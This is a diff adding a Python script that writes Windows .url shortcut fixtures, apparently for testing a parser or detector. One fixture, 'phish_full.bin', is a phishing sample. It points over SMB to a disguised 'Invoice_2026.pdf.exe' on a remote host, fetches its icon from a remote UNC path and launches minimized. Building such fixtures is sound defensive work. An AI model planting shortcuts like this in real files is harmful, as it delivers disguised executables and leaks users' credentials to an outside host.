@@ -1,0 +1,21 @@
+# Writes .url fixtures with the stdlib configparser WRITER (CRLF like Windows). usage: python -I THIS OUTDIR
+import configparser, io, sys
+out = sys.argv[1]
+def write(name, sections, defaults=None):
+    cp = configparser.RawConfigParser(defaults=defaults)
+    cp.optionxform = str
+    for sec, kv in sections:
+        cp.add_section(sec)
+        for k, v in kv:
+            cp.set(sec, k, v)
+    buf = io.StringIO()
+    cp.write(buf, space_around_delimiters=False)
+    with open(f"{out}/{name}", "wb") as f:
+        f.write(buf.getvalue().replace("\n", "\r\n").encode("cp1252"))
+write("phish_full.bin", [("InternetShortcut", [("URL", r"file://\\198.51.100.7\share\Invoice_2026.pdf.exe"),
+      ("WorkingDirectory", r"C:\Users\Public\Downloads"), ("IconFile", r"\\198.51.100.7\icons\pdf.ico"),
+      ("IconIndex", "13"), ("HotKey", "1601"), ("ShowCommand", "7")])], {"BASEURL": "https://docs.example.org/"})
+write("minimal_https.bin", [("InternetShortcut", [("URL", "https://login.example-portal.net/auth?id=4417&r=1"),
+      ("IDList", "")])])
+write("decoy_desktop_entry.bin", [("Desktop Entry", [("Type", "Link"), ("Name", "Portal"),
+      ("URL", "https://decoy.example.com/"), ("Icon", "text-html")])])
